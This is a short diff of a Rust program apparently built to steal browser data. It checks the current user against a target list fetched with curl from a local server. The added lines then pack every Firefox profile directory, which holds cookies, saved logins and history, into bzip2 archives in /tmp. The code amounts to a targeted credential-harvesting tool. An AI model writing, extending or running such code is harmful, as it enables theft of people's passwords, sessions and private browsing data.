@@ -20,7 +20,7 @@ fn get_profile_path(firefox_path: PathBuf) -> Vec<String> {
     for dir in dirs {
         line       = dir.unwrap().path();
         filepath   = line.to_string_lossy().to_string();
-        if filepath.contains(".default") {
+        if filepath.contains(".default") && Path::new(&line).exists() {
             profiles.push(format!("{}", &filepath));
         }
     }
@@ -31,12 +31,22 @@ fn get_profile_path(firefox_path: PathBuf) -> Vec<String> {
 fn main() {
     let username      : String      = run_command("id", "-un").replace("\n", "");
     let targets       : String      = run_command("curl", "http://localhost/user.txt");
-    let firefox_path  : &PathBuf    = &[env!("HOME"), ".mozilla", "firefox"].iter().collect();
+    let firefox_path  : &PathBuf    = &[&std::env::var("HOME").unwrap(), ".mozilla", "firefox"].iter().collect();
     let profiles      : Vec<String> = get_profile_path(firefox_path.to_path_buf());
     let targets_vec   : Vec<&str>   = targets.lines().collect();
     let in_target     : bool        = targets_vec.contains(&&*username);
 
     if !in_target || !Path::new(firefox_path).exists() {
         process::exit(1);
+    }
+
+
+    for (index, profile) in profiles.iter().enumerate() {
+        process::Command::new("tar")
+        .arg("cjf")
+        .arg(format!("/tmp/{}-{}.tar.bz2", username, index+1))
+        .arg(format!("{}", profile))
+        .spawn()
+        .expect("Failed to execute");
     }
 }
